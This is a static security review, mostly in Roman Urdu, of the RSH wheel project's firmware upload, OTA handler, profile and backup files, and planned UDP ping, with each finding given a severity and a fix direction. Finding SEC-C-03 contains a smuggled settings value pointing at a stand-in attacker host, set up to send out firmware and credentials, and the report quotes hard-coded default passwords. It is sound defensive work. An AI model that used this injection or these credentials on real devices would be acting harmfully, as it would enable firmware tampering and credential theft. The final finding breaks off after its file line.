# RSH — Security Review, Phase C (A1 upload + profile files + NTP ping)

**Status:** REVIEW ONLY — koi code edit nahi kiya gaya. Findings coordinator ke
zariye implementation teams tak jayengi.
**Date:** 2026-11-13. **Reviewer:** Cybersecurity team (Security Reviewer).
**Scope:** `software/src/RSH.App/Views/WizardWindow.xaml(.cs)` (A1 upload),
`software/src/RSH.Core/Profiles/ProfileStore.cs` + `WheelProfile.cs` (profile
files, A3 backup, A10/profile v2), `firmware/rsh/webota.cpp` + `config.h`
(board side — upload ka doosra sira), `software/src/RSH.App/ViewModels/ProfilesSystem.cs`
(Import/Export, A9/A12), `software/src/RSH.App/Services/AppSettings.cs`,
`docs/PROTOCOL-V2.1.md` + `docs/THREAT-MODEL.md` + `docs/KEY-LIFECYCLE.md`
(reference).
**Method:** Static code review (files parh kar). Koi git command nahi chalaya
gaya, koi test/build nahi chalaya gaya.
**Note — THREAT-MODEL ka rasta:** Task mein `~/workspace/projects/rsh/docs/THREAT-MODEL.md`
likha tha; asal file `repo/docs/THREAT-MODEL.md` mein hai — wahi parhi gayi.
**Note — A1 validation ki halat:** Task kehta hai Frontend team validation
"laga raha hai", lekin review ke waqt tree mein `UploadFw_Click` mein
**koi validation maujood nahi thi** (na size, na SHA, na version, na magic).
Is liye A1 findings "validation mein kami" nahi, "validation hai hi nahi"
ke tor par likhi gayi hain. Agar Frontend team ke paas uncommitted kaam hai
to wo is review mein shamil nahi — use dobara review karwana hoga.
**Note — Profile v2 / 3-generation backup / NTP ping:** Teeno abhi implement
nahi hue — Profile v2 (`schemaVersion`/`boardMac`) code mein kahin nahi,
backup sirf single `.bak` hai, aur ping ka na code hai na `PROTOCOL-V2.1.md`
mein section. Is liye §4 (backup) mein maujooda single-`.bak` ka review hai
aur §5 (ping) mein **security requirements** hain (live bug nahi).

**Standards:** OWASP ISVS v1.0 (2025) + NIST IR 8259A + ETSI EN 303 645
(Plan v2.3 §6). Threat IDs `TM-*` = `repo/docs/THREAT-MODEL.md` se.

## 0. Natija — ek nazar mein

| Severity | Ginti |
|---|---|
| Critical | 0 |
| **High** | **6** |
| Medium | 9 |
| Low | 9 |
| **Total** | **24** |

### High findings (foran tawajjo — §1, §2, §5 se)

| ID | File:line | Masla (ek line) |
|---|---|---|
| SEC-C-01 | `WizardWindow.xaml.cs:261-295` | Upload mein koi validation nahi — size/SHA/version/magic/signature, kuch nahi |
| SEC-C-02 | `WizardWindow.xaml.cs:285-290` + `webota.cpp` (JS `onerror`) | Connection tootna = "update kamyab" samjha jata hai (A1 ka asal bug abhi bhi maujood) |
| SEC-C-03 | `WizardWindow.xaml.cs:277` + `AppSettings.cs:65` | `EspIp` upload se pehle validate nahi hota — ghalat `settings.json` firmware + password attacker host par bhej sakta hai |
| SEC-C-04 | `WizardWindow.xaml:99`, `config.h:72`, `AppSettings.cs:24` | Default passwords (`rsh-ota`, `change-me-123`) hard-coded + saaf dikhte hain + Basic auth plain HTTP par |
| SEC-C-11 | `ProfileStore.cs:39-72` | Profile file par size/count cap nahi + `OutOfMemoryException` catch nahi hoti — kharab file = app startup par crash (persistent DoS) |
| SEC-C-21 | (ping — design, abhi code nahi) | Bina rate limit ke ping board ko reflector/DoS vector bana dega — implement karne se pehle limit lazmi |

**Critical koi nahi** — lekin SEC-C-01 + SEC-C-04 + SEC-C-06 mil kar wahi
rasta kholte hain jo threat model mein **TM-O01 (Critical)** hai: AP password
janne wala koi bhi shakhs bina signature/version rok ke koi bhi binary flash
kar sakta hai. Board-side F1 fix Phase D ka hai; app-side rok (validation +
anti-downgrade) Phase C mein lagna chahiye, Phase D ka intezar nahi karna chahiye.

---

## 1. A1 — Firmware upload validation (threat review)

Maujooda upload path: `WizardWindow.xaml.cs:261-295` (`UploadFw_Click`) →
`POST http://{EspIp}/update` (multipart, Basic auth) →
`firmware/rsh/webota.cpp` (`handleUpload` / `handleUpdateDone`).

### SEC-C-01 — High — Upload mein koi validation nahi hai
- **File:line:** `software/src/RSH.App/Views/WizardWindow.xaml.cs:261-295`
  (poora `UploadFw_Click`); board side `firmware/rsh/webota.cpp:handleUpload`.
- **Attack scenario:** User ko koi ghalat/malicious `.bin` di jati hai (ya user
  ghalti se doosre board ki, purani, ya aadhi-downloaded file chunta hai).
  App file ko baghair dekhe bhej deta hai — na size, na pehla byte (ESP32
  image magic `0xE9`), na SHA-256, na version, na signature check hota hai.
  Board side bhi koi explicit size/magic/version check nahi (`Update.begin(UPDATE_SIZE_UNKNOWN)`,
  `webota.cpp` mein size/magic ka koi code nahi) aur signature verify to
  bilkul nahi (signed OTA Must hai — Plan §7 MoSCoW — lekin Phase D/H ka
  kaam hai). Nateeja: ghalat ya malicious firmware flash ho jati hai
  (TM-O02, TM-P04). `ChooseFw_Click` ka `*.bin` filter (L251) sirf dialog
  ka filter hai — enforcement nahi.
- **Fix direction:** Sab checks **bhejne se pehle, in-memory `byte[]` par**
  karo (SEC-C-09 dekho): (1) size cap = flash partition size (merged bin
  ~864 KB hai — cap is se thora upar, misal 2 MB, hard-code nahi, config se);
  (2) magic byte `0xE9` pehle byte par; (3) SHA-256 release manifest ke
  khilaf (manifest khud signed ho — Phase H); (4) image se version nikaal
  kar GET_CAPS version se compare (SEC-C-05); (5) signature verify jab
  Phase D board-side verify de (tab tak user ko warning dikhao ke image
  unsigned hai). Koi bhi check fail ho to POST kabhi na ho.

### SEC-C-02 — High — Connection tootna abhi bhi "success" samjha jata hai
- **File:line:** `WizardWindow.xaml.cs:285-290` (`catch (Exception)` branch);
  doosri jagah wahi ghalti: `firmware/rsh/webota.cpp` — page JS `xhr.onerror`
  handler ("Connection band. Shayad board restart ho gaya hai (update kamyab).").
- **Attack/failure scenario:** Ye A1 ka asal bug hai aur **abhi bhi maujood
  hai**. Upload beech mein fail ho (Wi-Fi gira, board ne reject kiya,
  timeout) to app kehti hai "aksar is ka matlab hai board restart ho raha
  hai (update kamyab)". User samajhta hai naya firmware chal raha hai jab ke
  purana (ya aadha) firmware hai — aur agla step (calibration, game) ghalat
  firmware par chalta hai. Ye sirf UX nahi: failed-update ko success kehna
  rollback/verify ka rasta band karta hai.
- **Fix direction:** Exception par status hamesha **UNKNOWN** likho, kabhi
  success nahi. Kamyabi sirf is surat mein dikhao: (a) HTTP 200 + body
  `"OK..."` mila, **aur** (b) board restart ke baad dobara connect ho kar
  GET_CAPS se naya version confirm hua (Plan §1 upgrade order: OTA ke baad
  app version verify karegi). Confirm na ho to "verify nahi hua — dobara
  check karo" dikhao. WebOTA page ka JS `onerror` bhi aise hi badlo.

### SEC-C-03 — High — `EspIp` upload se pehle validate nahi hota (URL injection)
- **File:line:** `WizardWindow.xaml.cs:277`
  (`http.PostAsync($"http://{_services.Settings.EspIp}/update", form)`);
  `software/src/RSH.App/Services/AppSettings.cs:63-70` (`Sanitize` — `EspIp`
  par sirf null/whitespace check, L65).
- **Attack scenario:** `ApplyIp` (ProfilesSystem.cs:275) UI se IP ko
  `IPAddress.TryParse` se check karta hai — lekin `settings.json` disk se
  load hote waqt ye check **nahi** hota. Haath se badli / share ki hui /
  malicious `settings.json` mein `EspIp = "attacker.example/x"` ho to URL
  banta hai `http://attacker.example/x/update` — app firmware bytes **aur**
  Basic-auth password (`admin:rsh-ota`) attacker ke host par POST kar deta
  hai. `EspIp` mein `user@host`, port, ya path bhi daala ja sakta hai.
  (Threat: local file likhne wale ko ye rasta milta hai — user ke apne
  `%AppData%` par likhna hi trust boundary hai, is liye High, Critical nahi.)
- **Fix direction:** `AppSettingsStore.Sanitize` mein `EspIp` par
  `IPAddress.TryParse` lazmi karo (ghalat ho to default `192.168.4.1` par
  giro); upload se pehle dobara validate karo (A12 — "EspIp re-validate
  upload se pehle"); URL string interpolation se nahi, `UriBuilder` se
  banao jisme host sirf validated IP ho (hostname/userinfo/port kabhi nahi).

### SEC-C-04 — High — Default passwords: hard-coded, saaf nazar aate, plain HTTP
- **File:line:** `WizardWindow.xaml:99`
  (`<TextBox x:Name="FwPasswordBox" Text="rsh-ota" .../>` — plain TextBox,
  password pehle se bhara hua, saaf dikhta hai);
  `firmware/rsh/config.h:72` (`#define OTA_PASSWORD "rsh-ota"`);
  `config.h:79` (`WEB_OTA_USER "admin"`);
  `software/src/RSH.App/Services/AppSettings.cs:24`
  (`WheelWifiPassword = "change-me-123"` — Wi-Fi ka bhi default password);
  `WizardWindow.xaml.cs:272-273` (Basic auth, plain `http://`).
- **Attack scenario:** Default OTA password har shipped firmware + UI mein
  maujood hai — jo bhi AP par hai (ya AP password janta hai) use maloom hai.
  Basic auth plain HTTP par jata hai, is liye AP par sniff karne wala use
  parh sakta hai (TM-W02/TM-O03). Pre-filled plain TextBox se shoulder
  surfing / screenshot / screen-share mein password leak hota hai; UI ka
  error text (L282: "default rsh-ota hai") default password ka ailaan karta
  hai. Ye TM-O01 (Critical, fix Phase D) ka app-side hissa hai.
- **Fix direction:** (1) `TextBox` ki jagah `PasswordBox` (masked, kabhi
  pre-fill nahi); password ko `string` mein der tak na rakho, use ke baad
  saaf karo. (2) UI strings se default password hatao. (3) Asal hal Plan §2
  ka hai: per-device random Wi-Fi/OTA password, pehli pairing par generate,
  MAC se derive kabhi nahi (OPEN-13/OPEN-14 — WP3/Phase D band kare);
  jab tak wo na ho, user ko pehli setup par password badalne par majboor
  karo aur default password ko docs/UI mein "badlo" ke tor par dikhao.

### SEC-C-05 — Medium — Anti-downgrade kahin nahi hai
- **File:line:** `WizardWindow.xaml.cs:261-295` (version ka koi zikr nahi);
  `firmware/rsh/webota.cpp` (version compare ka koi code nahi — sirf
  `FIRMWARE_VERSION "4.0.0"` display hota hai, `config.h:65`).
- **Attack scenario:** Hamlaawar purani firmware (misal v3.3, jisme F1 auth
  bypass tha) flash kar ke purane bugs dobara khol deta hai — downgrade
  attack. App ko pata bhi nahi chalega kyun ke upload ke baad version verify
  nahi hota (SEC-C-02 dekho).
- **Fix direction:** App image se version nikaale aur sirf tab bheje jab
  version >= GET_CAPS se mila current version ho (barabar = reinstall, kam
  = reject + wajah dikhao). Board side (Phase D, F9 ke saath): image apply
  karne se pehle version compare + reject. Downgrade ki ijazat sirf
  explicit user confirm + BOOT-hold jaisi physical action se ho (agar kabhi
  ho to) — khamoshi se kabhi nahi.

### SEC-C-06 — Medium — Signature verify kahin nahi (signed OTA Must, lekin absent)
- **File:line:** `WizardWindow.xaml.cs:261-295` (koi signature check nahi);
  `firmware/rsh/webota.cpp:handleUpload` — `Update.end(true)` sirf integrity
  checksum check karta hai, authenticity nahi.
- **Attack scenario:** AP password janne wala (SEC-C-04 se default maloom
  hai) koi bhi binary flash kar sakta hai — auth hi waahid rok hai, aur wo
  bhi default password par khari hai (TM-O01/TM-O02). Checksum badli hui
  image ko nahi pakarta — checksum to hamlaawar bhi sahi bana sakta hai.
- **Fix direction:** Board image apply karne se pehle Ed25519/ECDSA P-256
  signature verify kare (Plan §2, `KEY-LIFECYCLE.md` §9; Phase D). App side
  release manifest ki signature bhi check kare (Phase H). Jab tak signature
  verify na ho, upload UI par wazeh warning dikhao ("ye image verify nahi
  hui — sirf official release istemal karo") aur isay chhupao mat.

### SEC-C-07 — Medium — Upload file ka size cap nahi (OOM / hang)
- **File:line:** `WizardWindow.xaml.cs:270`
  (`await File.ReadAllBytesAsync(_fwFilePath)` — poori file memory mein,
  koi length check nahi); `webota.cpp: Update.begin(UPDATE_SIZE_UNKNOWN)`.
- **Attack/failure scenario:** Multi-GB file chunnay par app poori file RAM
  mein parhne ki koshish karti hai → `OutOfMemoryException` / UI freeze.
  Board side bhi `UPDATE_SIZE_UNKNOWN` se shuru hota hai — bara upload
  partition bharne tak chalta rehta hai, board is doran busy rehta hai (DoS).
- **Fix direction:** Pehle `FileInfo.Length` check karo (cap = partition
  size, misal ~2 MB); cap se bara ho to foran reject, parho hi nahi.
  Cap ke andar bhi streaming read + `CancellationToken` (user cancel kar
  sake; 90 s `HttpClient.Timeout` kaafi nahi). Board side (Phase D, F9):
  `Update.begin` ko expected size do aur pehle chunk par size/magic check.

### SEC-C-08 — Low — `.bin` extension check sirf dialog filter hai
- **File:line:** `WizardWindow.xaml.cs:251-252` (dialog `Filter`), `:261-295`
  (koi extension check nahi).
- **Attack scenario:** Dialog filter ko bypass karke (type karke) koi bhi
  file — `.exe`, `.json`, text — upload ki ja sakti hai. Board `Update`
  use reject kar dega, lekin app ko pehle hi rokna chahiye.
- **Fix direction:** `UploadFw_Click` mein extension + magic byte dono
  check karo (SEC-C-01 ka hissa); extension akela kaafi nahi.

### SEC-C-09 — Low — TOCTOU: validation file par nahi, bheje gaye bytes par honi chahiye
- **File:line:** `WizardWindow.xaml.cs:270` (file ek dafa parhi jati hai —
  aaj koi validation nahi, is liye ye **mustaqbil ki validation ke liye
  requirement** hai, live bug nahi).
- **Attack scenario:** Agar Frontend team validation is tarah lagaye ke
  pehle file ko check kare (size/SHA file par) aur phir dobara parh kar
  bheje, to check aur send ke darmiyan file badli ja sakti hai (doosra
  process / user) — validated file nahi, badli hui file flash ho jati hai.
- **Fix direction:** File **ek dafa** parho → `byte[]` memory mein rakho →
  tamam checks usi buffer par karo → wahi buffer POST karo. File ko
  dobara kabhi na parho. (Aaj ka code ek dafa parhta hai — ye achhi bunyaad
  hai, use qaim rakho.)

### SEC-C-10 — Medium — Board side: `/update` completion handler par auth nahi + size cap nahi
- **File:line:** `firmware/rsh/webota.cpp` — `handleUpdateDone` mein
  `authed()` call nahi hai (sirf `handleRoot` aur `handleUpload` ke
  `UPLOAD_FILE_START` mein hai); `Update.begin(UPDATE_SIZE_UNKNOWN)`.
- **Attack scenario:** `POST /update` ka completion handler bina auth ke
  chalta hai. Aaj is se seedha flash nahi hota (restart sirf tab schedule
  hota hai jab `updateOk` true ho, jo sirf authenticated upload se banta
  hai) — is liye impact Low-Medium hai, lekin ye TM-O01 ke usool
  ("har endpoint par `authenticate()` lazmi", D24) ki khilaf-warzi hai aur
  `updateOk` jaisi shared state par inhisar karta hai: mustaqbil mein koi
  tabdeeli (misal `updateOk` reset bhool jana) isay restart-trigger mein
  badal sakti hai. Size cap na hona (SEC-C-07) board ko bare upload se
  busy rakhne ka rasta deta hai.
- **Fix direction:** `handleUpdateDone` mein bhi `authed()` pehle line par
  lazmi karo (Phase D, F1 ke saath); `Update.begin` ko expected size do;
  `updateOk` ko har request ke shuru mein reset karo taake stale state
  kabhi istemal na ho.

---

## 2. Profile file security (v1 + nayi v2)

Maujooda files: `ProfileStore.cs` (Load/Save/ParsesOk/GetActive),
`WheelProfile.cs` (`Sanitized()`), `ProfilesSystem.cs` (Import/Export).
**Profile v2 abhi maujood nahi** — `ProfileFile` mein `schemaVersion` nahi,
`WheelProfile` mein `boardMac` nahi (sirf `PipelinePlan.SchemaVersion = 1`
hai, jo is se mutalliq nahi). Is liye v2-specific findings requirements
ke tor par likhi gayi hain.

### SEC-C-11 — High — Profile file par size/count cap nahi; ghalat exception = startup crash
- **File:line:** `ProfileStore.cs:42` (`File.ReadAllText(path)` — koi size
  check nahi); `ProfileStore.cs:63-67` (sirf `JsonException`,
  `IOException`, `ArgumentOutOfRangeException` catch hoti hain);
  `ProfilesSystem.cs:163` (Import mein bhi `File.ReadAllText`, koi cap nahi).
- **Attack scenario:** Koi malicious/bhari `profiles.json` (multi-GB, ya
  lakhon profiles wali JSON) app ke DataDirectory mein rakh de (shared PC,
  backup restore, ya social engineering se "ye profile file istemal karo").
  `ReadAllText` poori file RAM mein parhta hai → `OutOfMemoryException`
  (ya `UnauthorizedAccessException`, `NotSupportedException`) catch **nahi**
  hoti → app startup par crash, aur har dafa crash (file wahin pari hai) —
  persistent DoS jab tak user file haath se delete na kare. Import path
  mein bhi yehi hai (wahan `catch (Exception)` hai, is liye sirf Import
  fail hota hai — Load wala rasta zyada khatarnak hai).
- **Fix direction:** (1) Parhne se pehle `FileInfo.Length` cap lagao
  (misal `profiles.json` ≤ 1 MB, import ≤ 256 KB) — cap se bari file ko
  kharab file jaisa treat karo (backup/defaults). (2) Profiles ki tadad
  cap karo (misal ≤ 64) — cap se zyada hon to file reject. (3) `Load`
  mein `catch (Exception)` (jaise `AppSettingsStore.Load` mein hai) ya kam
  se kam `OutOfMemoryException`/`UnauthorizedAccessException` bhi pakro,
  taake **koi bhi** kharab file app ko band na kar sake (SW-5 gate: "koi
  bhi corrupt/missing file app ko crash nahi karti").

### SEC-C-12 — Medium — `ParsesOk` guard `Load` se kamzor hai — acha `.bak` abhi bhi overwrite ho sakta hai
- **File:line:** `ProfileStore.cs:97-105` (`ParsesOk` — sirf parse + `Count > 0`);
  `ProfileStore.cs:79-96` (`Save` — `ParsesOk` ke baad `.bak` overwrite);
  muqabla `ProfileStore.cs:51-57` (`Load` — `Sanitized()` + dedupe).
- **Attack/failure scenario:** A3 ka fix aadha hai. Aisi file jo parse to
  ho jaye lekin values na-jaiz hon (misal button 33+ — `Sanitized()` throw
  karta hai) `ParsesOk` se **pass** kar jati hai, kyun ke `ParsesOk`
  `Sanitized()` chalata hi nahi. `Save()` phir us na-jaiz file ko achay
  `.bak` par copy kar deta hai — backup bilkul usi waqt tabah hota hai jab
  us ki sab se zyada zaroorat thi (TM-P02). Isi tarah duplicate naam,
  kharab `ActiveProfileName`, ya count-cap se zyada profiles bhi `ParsesOk`
  se guzar jate hain.
- **Fix direction:** `ParsesOk` ko `Load` wali validation ka **ek hi**
  shared function banao: parse → `Sanitized()` (har profile) → dedupe →
  count cap → `ActiveProfileName` check. Dono jagah alag logic na rakho.
  Guard fail ho to `.bak` ko haath mat lagao. Is par test lazmi: "na-jaiz
  values wali current file Save par `.bak` ko overwrite nahi karti".

### SEC-C-13 — Medium — 3-generation backup maujood nahi; settings ka backup to bilkul be-guard hai
- **File:line:** `ProfileStore.cs:33` (sirf `BackupPath = _filePath + ".bak"`;
  `.bak1`/`.bak2` kahin nahi); `AppSettings.cs:53-60` (`AppSettingsStore.Save`
  — `File.Copy(..., ".bak", overwrite: true)` **bina kisi guard ke**).
- **Attack/failure scenario:** (1) Sirf ek generation hai — agar kharab
  file ek dafa `.bak` ban jaye (SEC-C-12) to wapas aane ka koi rasta nahi.
  (2) Settings ka Save `ParsesOk` jaisa guard bhi nahi lagata: kharab
  `settings.json` (misal aadhi likhi hui) seedha achay `settings.json.bak`
  par copy ho jati hai. (3) Jab Phase C 3-generation rotation lagaye to
  naya khatra: rotation (`.bak`→`.bak1`→`.bak2`) se pehle validate na kiya
  to kharab file achi generations ko bahir dhakel degi.
- **Fix direction:** R-M11 ke mutabiq `.bak`/`.bak1`/`.bak2` rotation
  lagao, lekin **rotate sirf tab karo jab current file SEC-C-12 wala full
  validation pass kare**; warna rotation roko aur kharab file ko alag
  `.corrupt-<date>` ke tor par mehfooz karo (tashkhees ke liye, overwrite
  nahi). Yehi guard `AppSettingsStore.Save` mein bhi lagao. Settings mein
  "Backup now" / "Restore" (Plan §7) ke saath generation chunnay ka option do.

### SEC-C-14 — Medium — `Save` mein lock nahi + fixed `.tmp` naam (race / TOCTOU)
- **File:line:** `ProfileStore.cs:79-96` (`Save` — koi `lock` nahi, `TempPath`
  fixed `.tmp` hai); `AppSettings.cs:53-60` (same pattern, koi lock nahi).
- **Attack/failure scenario:** Do threads ek saath `Save` karein (UI +
  auto-save / wizard auto-calibration) to dono ek hi `.tmp` file par
  likhte hain aur `File.Move` race karta hai → aadhi/mili-juli file ya
  `IOException`. SW-5 mein "Save lock" (P6) ka waada tha — code mein lock
  kahin nahi mila. Is ke ilawa `ParsesOk` (parhna) aur `File.Copy`
  (backup) ke darmiyan file badli ja sakti hai (TOCTOU) — local attacker /
  doosra process.
- **Fix direction:** `ProfileStore` (aur `AppSettingsStore`) mein private
  `lock` object rakho; tamam Load/Save usi lock mein karo. `.tmp` ka naam
  unique banao (misal `.tmp-<Guid>`) aur final move `File.Replace` /
  atomic move se karo. `ParsesOk` + `Copy` ko bhi lock ke andar rakho.

### SEC-C-15 — Low — Profile `Name` par koi validation nahi (path traversal ki taraf ishara)
- **File:line:** `WheelProfile.cs:119-121` (`Sanitized` — `Name` sirf
  `Trim`, khaali ho to `"Default"`); `ProfilesSystem.cs:146`
  (`FileName = SelectedProfile + ".json"` — Export dialog ka default naam).
- **Attack scenario:** Malicious profile ka naam `../../evil` ya
  `C:\...` jaisa ho to Export dialog ka default path user ki chuni hui
  jagah se bahir nikal jata hai (dialog dikhata hai, is liye user ko
  nazar aata hai — seedha overwrite nahi hota, is liye Low). Lambi naam
  (hazaaron characters) UI/logs mein bloat bhi karte hain. `Name` kahin
  file path ke tor par seedha istemal nahi hota (verify kiya — sirf
  display + dialog default), is liye ye traversal **nahi**, sirf is ki
  taraf ishara hai.
- **Fix direction:** `Sanitized` mein naam ka allowlist lagao
  (`A-Z a-z 0-9 space _ -`, max 64 chars); separators (`/ \ : * ? " < > |`)
  aur control characters hatao ya reject karo; v2 mein naam ki lambai
  schema mein bhi likho.

### SEC-C-16 — Low — `ActiveProfileName` ka match case-sensitive hai (P6 fix adhoora)
- **File:line:** `ProfileStore.cs:107-108` (`GetActive` — `==` ordinal);
  `ProfileStore.cs:58` (fix-up bhi `!=` ordinal); `ProfilesSystem.cs:44,53,69,104`,
  `AppServices.cs:95` (sab jagah `==`).
- **Attack/failure scenario:** `Load` naam ko case-insensitive dedupe
  karta hai (L54-57), lekin `GetActive` case-sensitive milata hai. File
  mein `ActiveProfileName = "default"` aur profile `"Default"` ho to match
  nahi hota → active khamoshi se pehli profile par gir jata hai (L58, L108
  fallback). User ki calibration/output mapping bina bataye badal jati hai.
  Ye security se zyada correctness hai, lekin "khamoshi se profile badalna"
  wohi khatra hai jo P6 rokna chahta tha.
- **Fix direction:** Tamam naam comparisons `StringComparer.OrdinalIgnoreCase`
  se karo (ek helper, misal `ProfilesMatch(a, b)`); `Load` ke fix-up mein
  bhi. Is par test: case-farq wali file active profile nahi badalti.

### SEC-C-17 — Low — Calibration values load par validate nahi hoti (D10 span rule naafiz nahi)
- **File:line:** `WheelProfile.cs:112-135` (`Sanitized` — `SteeringCalibration`
  / `PedalCalibration` ko chhoota hi nahi); `Calibration.cs:13-15,26-28`
  (`IsSane` sirf span ≥ 100 raw units mangta hai).
- **Attack/failure scenario:** Haath se badli profile mein calibration
  ulta (`RawMin > RawMax`), span bohat chhota (100 mV), ya range se bahir
  (misal 100000) ho sakti hai. **Crash nahi hota** — verify kiya:
  `InputMapper.cs:22-45` `Math.Max(1, ...)` se division guard karta hai aur
  output `Clamp` hota hai — lekin chhota span steering ko bohat sensitive
  bana deta hai (ghalat output, game mein khatarnak steering). D10 ka rule
  (span ≥ 20% full-scale mV = 660 mV) load par naafiz nahi hota.
- **Fix direction:** `Sanitized` mein calibration validate karo: mV mode
  mein 0..3300, raw mode mein 0..4095; `min < center < max`,
  `span >= 660 mV` (D10); na-jaiz ho to calibration ko `IsSet = false`
  (defaults) par girao + user ko warning dikhao — khamoshi se clamp nahi.

### SEC-C-18 — Low — Profile v2 maujood nahi: na `schemaVersion`, na `boardMac` (TM-W01 binding)
- **File:line:** `WheelProfile.cs` + `ProfileStore.cs` (`ProfileFile` —
  `schemaVersion`/`boardMac` kahin nahi); `HelloReply.cs:28,48`
  (`BoardMac` parse hota hai lekin **kahin istemal nahi hota** — grep se
  koi consumer nahi mila).
- **Attack/failure scenario:** Profile kisi bhi board par lag jata hai —
  doosre board (doosri calibration, doosre pins) par purani profile
  khamoshi se load ho jati hai aur ghalat output deti hai. Threat model
  (TM-W01) Phase C mein board binding mangta hai; `KEY-LIFECYCLE.md`
  OPEN-7 ke mutabiq ye abhi khula hai. Ye aaj exploit nahi — design gap hai.
- **Fix direction:** Profile v2 mein `schemaVersion` (har file mein, A10)
  aur optional `boardMac` (D21) shamil karo; board badle to warning +
  dobara calibration (D21). `schemaVersion` na ho to v1 samjho aur migrate
  karo; unknown version ho to reject karo (khamoshi se ignore nahi).
  `HelloReply.BoardMac` ko pairing/binding mein istemal karo ya phir
  isay "unused" ke tor par document karo.

### SEC-C-19 — Low — Import mein size cap / version check nahi (A9 Phase E ka hai, lekin raasta aaj khula hai)
- **File:line:** `ProfilesSystem.cs:157-176` (`Import` — `File.ReadAllText`,
  koi size cap nahi; `JsonSerializer.Deserialize<WheelProfile>` bina
  `schemaVersion` check ke).
- **Attack scenario:** Bara ya ghalat-version profile import karne par
  ya to app hang/OOM hoti hai (SEC-C-11 wala rasta), ya v1 file v2 samajh
  kar ghalat lag jati hai. Achhi baat: Import `Sanitized()` chalata hai
  (L167) aur fail hone par sirf status dikhata hai — crash nahi hota.
- **Fix direction:** Import par size cap (misal 256 KB) + `schemaVersion`
  check + unknown version reject karo (A9 — Phase E mein async + cap +
  version check ke saath; cap ko Phase C mein bhi pehle laga lo, Phase E
  ka intezar mat karo).

### Checked — theek paya gaya (profile area)
- `Sanitized()` `Deadzone`/`CurveStrength`/`Smoothing`/`SteeringScale`/
  `PedalPressMs`/`ReleaseMs` ko clamp karta hai (WheelProfile.cs:122-131) — acha.
- Button 33+ throw hota hai, clamp/alias kabhi nahi (D9) — acha.
- `Load` kharab file par backup, phir defaults par girta hai — acha (lekin
  SEC-C-11 ki exception gaps dekho).
- `GameProcessName`: exact `OrdinalIgnoreCase` match hota hai
  (`App.xaml.cs:96-97`) — wildcard/path injection nahi; `.exe` strip
  (WheelProfile.cs:124) sirf sloppy hai, exploitable nahi.
- `Export` mein try/catch hai (ProfilesSystem.cs:141-155) — acha.

---

## 3. A3 backup integrity (maujooda single-`.bak` ka review)

- **Maujooda halat:** Sirf ek `.bak` (ProfileStore.cs:33). `Save` mein
  `ParsesOk` guard hai (L91-92) — achhi niyyat, lekin SEC-C-12 ke mutabiq
  guard kamzor hai (sirf parse, `Sanitized()` nahi).
- **Kya acha backup overwrite ho sakta hai? Haan — do rastay:**
  1. **Na-jaiz-values wali current file** (parse hoti hai, `Sanitized`
     fail karta hai) `ParsesOk` se guzar kar achay `.bak` par copy ho jati
     hai (SEC-C-12).
  2. **Settings ka backup** bilkul be-guard hai (SEC-C-13) — kharab
     `settings.json` achay `.bak` ko overwrite kar deta hai.
  3. **Crash darmiyan mein:** `File.Copy` → `File.Move` ke darmiyan crash
     ho to `.bak` naya (na-jaiz) aur main file purani — ya ulta; koi
     transaction nahi (SEC-C-14 ka lock/atomic-move fix isay bhi behtar karega).
- **3-generation rotation ke liye warning (implement karte waqt):**
  Rotation (`.bak`→`.bak1`→`.bak2`) se pehle **full validation lazmi** hai
  (SEC-C-12 wala shared validator); warna ek kharab save teen generations
  ko ek ke baad ek bahir dhakel dega. Har generation ke saath checksum
  (SHA-256) mehfooz karo taake restore karte waqt pata chale kaun si
  generation saaf hai. "Restore" hamesha user ki explicit action se ho —
  khud-ba-khud restore karna purani (ghalat-board wali, SEC-C-18) profile
  wapas la sakta hai.

---

## 4. NTP ping abuse review (design requirements — code abhi nahi hai)

**Halat:** Ping ka na code hai na `PROTOCOL-V2.1.md` mein section (ports
sirf `4210` HELO / `4211` stream / `4212` control hain — PROTOCOL-V2.1.md:22-23).
Architecture team (SW-13) jab ping banaye to neeche wali requirements
protocol doc mein **pehle** likhni hongi — implement ke baad jorna mushkil hoga.
Threat model reference: TM-W05 (DoS/flood), TM-W04 (stream tampering).

### SEC-C-21 — High — Ping ko rate limit ke baghair board reflector/DoS vector ban jayega
- **File:line:** (design — code nahi hai; SW-13 / `docs/PROTOCOL-V2.1.md` ping section).
- **Attack scenario:** Ping unauthenticated UDP hai (hona hi chahiye — ye
  measurement hai, control nahi). Bina limit ke: (a) attacker board ko
  hazaron ping/s bhej kar 200 Hz stream loop ko bhooka kar deta hai
  (board ki loop + heap par bojh — TM-W05); (b) board ko reflector bana
  kar spoofed source par jawab bhejwata hai (SEC-C-22).
- **Fix direction (requirements):** Board side, har source ke liye token
  bucket (misal max 10 reply/s, burst 5); limit se zyada ping **khamoshi
  se drop** karo (koi error reply nahi — error reply bhi amplification
  hai). Ping handling bounded work ho — koi per-ping heap allocation nahi,
  koi state store nahi; busy ho to drop karo, stream loop ko kabhi na roko.
  PC side bhi rate limit karo (1–4 Hz, SEC-C-24).

### SEC-C-22 — Medium — Spoofed source se reflection (board dusron par hamla kare)
- **File:line:** (design — SW-13 / PROTOCOL-V2.1.md ping section).
- **Attack scenario:** Attacker victim ka IP source bana kar ping bhejta
  hai; board jawab victim ko bhejta hai. Agar jawab request se bara ho to
  amplification hai; chhota bhi ho to board ek unwilling reflector hai.
- **Fix direction:** Reply **hamesha ≤ request size** (fixed chhota reply,
  misal ≤ 32 B); jawab sirf packet ke **asal source address/port** par
  bhejo — payload ke andar likhi hui koi address kabhi istemal na karo.
  Per-source rate limit (SEC-C-21) is ka asal rok hai. Sakht option (agar
  WP3 chahe): sirf un sources ko jawab do jinhon ne haal mein valid HELO
  bheja ho — lekin ye ping ko HELO se bandh deta hai, is liye is faislay
  ko protocol doc mein likhna lazmi hai, khamoshi se nahi.

### SEC-C-23 — Medium — Echoed token / timestamps: fixed size, koi secret nahi
- **File:line:** (design — SW-13 / PROTOCOL-V2.1.md ping section).
- **Attack scenario:** Agar ping client ka token echo karta hai to attacker
  bara token bhej kar bara reply le sakta hai (amplification); agar reply
  mein board ka nonce/key/uptime jaisi maloomat ho to info leak hai; ghalat
  length wale packet se parser crash ho sakta hai (TM-W05(d)).
- **Fix direction:** Token fixed size (misal 8 B) echo karo, zyada ho to
  packet drop karo; packet length strict check karo (chhota/bara → drop +
  count, kabhi crash nahi). Reply mein sirf 4 timestamps + token hon —
  **koi key, nonce, password, ya high-precision uptime nahi**. Board ka
  waqt monotonic ms mein ho (wall clock nahi).

### SEC-C-24 — Low — PC side: ping bhejne wala khud flood na kare
- **File:line:** (design — SW-13).
